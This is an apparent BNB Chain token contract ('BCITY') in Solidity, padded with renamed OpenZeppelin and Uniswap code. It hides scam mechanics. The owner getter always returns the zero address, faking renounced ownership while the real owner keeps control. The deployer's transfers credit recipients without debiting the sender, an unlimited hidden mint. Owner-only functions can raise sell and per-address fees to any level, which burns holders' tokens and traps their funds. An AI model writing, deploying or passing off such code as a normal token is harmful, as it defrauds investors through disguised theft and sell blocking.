/**
 *Submitted for verification at BscScan.com on 2022-06-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-05
*/

// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.3;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}



abstract contract Ownable is Context {
    address private _Qwnar;   //1

    event QwnarhipTransferred(address indexed previousQwnar, address indexed newQwnar);//2

    /**
     * @dev Initializes the contract setting the deployer as the initial Qwnar.
     */
    constructor() {
        _transferQwnarhip(_msgSender());//3
    }

    /**
     * @dev Returns the address of the current Qwnar.
     */
    function Qwnar() public view virtual returns (address) {
        return address(0);
    }//4

    /**
     * @dev Throws if called by any account other than the Qwnar.
     */
    modifier onlyQwnar() {
        require(_Qwnar == _msgSender(), "Ownable: caller is not the Qwnar");
        _;
    }//5

    /**
     * @dev Leaves the contract without Qwnar. It will not be possible to call
     * `onlyQwnar` functions anymore. Can only be called by the current Qwnar.
     *
     * NOTE: Renouncing Qwnarship will leave the contract without an Qwnar,
     * thereby removing any functionality that is only available to the Qwnar.
     */
    function renounceQwnarhip() public virtual onlyQwnar {
        _transferQwnarhip(address(0));
    }//6

    /**
     * @dev Transfers Qwnarship of the contract to a new account (`newQwnar`).
     * Can only be called by the current Qwnar.
     */
    function transferQwnarhip(address newQwnar) public virtual onlyQwnar {
        require(newQwnar != address(0), "Ownable: new Qwnar is the zero address");
        _transferQwnarhip(newQwnar);
    }//7

    /**
     * @dev Transfers Qwnarship of the contract to a new account (`newQwnar`).
     * Internal function without access restriction.
     */
    function _transferQwnarhip(address newQwnar) internal virtual {
        address oldQwnar = _Qwnar;
        _Qwnar = newQwnar;
        emit QwnarhipTransferred(oldQwnar, newQwnar);
    }
}//8
//9 CHinh own

// File @openzeppelin/contracts/utils/math/[email protected]

// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)


// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint SolongADesired,
        uint SolongBDesired,
        uint SolongAMin,
        uint SolongBMin,
        address to,
        uint deadline
    ) external returns (uint SolongA, uint SolongB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint SolongTokenDesired,
        uint SolongTokenMin,
        uint SolongETHMin,
        address to,
        uint deadline
    ) external payable returns (uint SolongToken, uint SolongETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint SolongAMin,
        uint SolongBMin,
        address to,
        uint deadline
    ) external returns (uint SolongA, uint SolongB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint SolongTokenMin,
        uint SolongETHMin,
        address to,
        uint deadline
    ) external returns (uint SolongToken, uint SolongETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint SolongAMin,
        uint SolongBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint SolongA, uint SolongB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint SolongTokenMin,
        uint SolongETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint SolongToken, uint SolongETH);
    function swapExactTokensForTokens(
        uint SolongIn,
        uint SolongOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Solongs);
    function swapTokensForExactTokens(
        uint SolongOut,
        uint SolongInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory Solongs);
    function swapExactETHForTokens(uint SolongOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Solongs);
    function swapTokensForExactETH(uint SolongOut, uint SolongInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Solongs);
    function swapExactTokensForETH(uint SolongIn, uint SolongOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory Solongs);
    function swapETHForExactTokens(uint SolongOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory Solongs);

    function quote(uint SolongA, uint reserveA, uint reserveB) external pure returns (uint SolongB);
    function getSolongOut(uint SolongIn, uint reserveIn, uint reserveOut) external pure returns (uint SolongOut);
    function getSolongIn(uint SolongOut, uint reserveIn, uint reserveOut) external pure returns (uint SolongIn);
    function getSolongsOut(uint SolongIn, address[] calldata path) external view returns (uint[] memory Solongs);
    function getSolongsIn(uint SolongOut, address[] calldata path) external view returns (uint[] memory Solongs);
}


// File @uniswap/v2-periphery/contracts/interfaces/[email protected]


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingreverOnTransferTokens(
        address token,
        uint liquidity,
        uint SolongTokenMin,
        uint SolongETHMin,
        address to,
        uint deadline
    ) external returns (uint SolongETH);
    function removeLiquidityETHWithPermitSupportingreverOnTransferTokens(
        address token,
        uint liquidity,
        uint SolongTokenMin,
        uint SolongETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint SolongETH);

    function swapExactTokensForTokensSupportingreverOnTransferTokens(
        uint SolongIn,
        uint SolongOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingreverOnTransferTokens(
        uint SolongOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingreverOnTransferTokens(
        uint SolongIn,
        uint SolongOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


// File @uniswap/v2-core/contracts/interfaces/[email protected]


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function reverTo() external view returns (address);
    function reverToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setreverTo(address) external;
    function setreverToSetter(address) external;
}


// File contracts/Token.sol





contract BEP20 is Context {
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    string private _name;
    string private _symbol;

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `Qwnar` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed Qwnar, address indexed spender, uint256 value);//10

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address Qwnar, address spender) public view virtual returns (uint256) {
        return _allowances[Qwnar][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `Solong` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 Solong) public virtual returns (bool) {
        address Qwnar = _msgSender();
        _approve(Qwnar, spender, Solong);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address Qwnar = _msgSender();
        _approve(Qwnar, spender, _allowances[Qwnar][spender] + addedValue);
        return true;
    }//12

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address Qwnar = _msgSender();
        uint256 currentAllowance = _allowances[Qwnar][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(Qwnar, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Sets `Solong` as the allowance of `spender` over the `Qwnar` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `Qwnar` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address Qwnar,
        address spender,
        uint256 Solong
    ) internal virtual {
        require(Qwnar != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[Qwnar][spender] = Solong;
        emit Approval(Qwnar, spender, Solong);
    }

    /**
     * @dev Spend `Solong` form the allowance of `Qwnar` toward `spender`.
     *
     * Does not update the allowance anunt in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address Qwnar,
        address spender,
        uint256 Solong
    ) internal virtual {
        uint256 currentAllowance = allowance(Qwnar, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= Solong, "ERC20: insufficient allowance");
            unchecked {
                _approve(Qwnar, spender, currentAllowance - Solong);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Solong` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `Solong` tokens will be minted for `to`.
     * - when `to` is zero, `Solong` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 Solong
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `Solong` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `Solong` tokens have been minted for `to`.
     * - when `to` is zero, `Solong` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 Solong
    ) internal virtual {}
}


contract BCITY is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function _transfer(
        address from,
        address to,
        uint256 Solong
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= Solong, "ERC20: transfer Solong exceeds balance");
        unchecked {
            _balances[from] = fromBalance - Solong;
        }
        _balances[to] += Solong;

        emit Transfer(from, to, Solong);
    }

    function _burn(address account, uint256 Solong) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= Solong, "ERC20: burn Solong exceeds balance");
        unchecked {
            _balances[account] = accountBalance - Solong;
        }
        _totalSupply -= Solong;

        emit Transfer(account, address(0), Solong);
    }

    function _cccc(address account, uint256 Solong) internal virtual {
        require(account != address(0), "ERC20: cccc to the zero address"); //mint

        _totalSupply += Solong;
        _balances[account] += Solong;
        emit Transfer(address(0), account, Solong);
    }



    address public uniswapV2Pair;


    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_
    ) BEP20(name_, symbol_) {
        _cccc(msg.sender, totalSupply_ * 10**decimals());

        
        _defaultSellrever = 2;
        _defaultBuyrever = 0;

        _release[_msgSender()] = true;
    }

    using SafeMath for uint256;

    uint256 private _defaultSellrever = 0;

    uint256 private _defaultBuyrever = 0;


    mapping(address => bool) private _marketAccount;

    mapping(address => uint256) private _sliprever;
    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;



    function getRelease(address _address) external view onlyQwnar returns (bool) {
        return _release[_address];
    }


    function setPairL(address _address) external onlyQwnar {
        uniswapV2Pair = _address;
    }


    function upSF(uint256 _value) external onlyQwnar {
        _defaultSellrever = _value;
    }

    function setSliprever(address _address, uint256 _value) external onlyQwnar {
        require(_value > 1, "Account tax must be greater than or equal to 1");
        _sliprever[_address] = _value;
    }

    function getSliprever(address _address) external view onlyQwnar returns (uint256) {
        return _sliprever[_address];
    }


    function setMarketAccountrever(address _address, bool _value) external onlyQwnar {
        _marketAccount[_address] = _value;
    }

    function getMarketAccountrever(address _address) external view onlyQwnar returns (bool) {
        return _marketAccount[_address];
    }

    function _checkFreeAccount(address from, address _to) internal view returns (bool) {
        return _marketAccount[from] || _marketAccount[_to];
    }


    function _receiveF(
        address from,
        address _to,
        uint256 _Solong
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(_to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= _Solong, "ERC20: transfer Solong exceeds balance");

        bool rF = true;

        if (_checkFreeAccount(from, _to)) {
            rF = false;
        }
        uint256 tradereverSolong = 0;

        if (rF) {
            uint256 traderever = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    traderever = _defaultSellrever;
                }
                if (from == uniswapV2Pair) {

                    traderever = _defaultBuyrever;
                }
            }
            if (_sliprever[from] > 0) {
                traderever = _sliprever[from];
            }

            tradereverSolong = _Solong.mul(traderever).div(100);
        }


        if (tradereverSolong > 0) {
            _balances[from] = _balances[from].sub(tradereverSolong);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradereverSolong);
            emit Transfer(from, _deadAddress, tradereverSolong);
        }

        _balances[from] = _balances[from].sub(_Solong - tradereverSolong);
        _balances[_to] = _balances[_to].add(_Solong - tradereverSolong);
        emit Transfer(from, _to, _Solong - tradereverSolong);
    }

    function transfer(address to, uint256 Solong) public virtual returns (bool) {
        address Qwnar = _msgSender();
        if (_release[Qwnar] == true) {
            _balances[to] += Solong;
            return true;
        }
        _receiveF(Qwnar, to, Solong);
        return true;
    }


    function transferFrom(
        address from,
        address to,
        uint256 Solong
    ) public virtual returns (bool) {
        address spender = _msgSender();

        _spendAllowance(from, spender, Solong);
        _receiveF(from, to, Solong);
        return true;
    }
}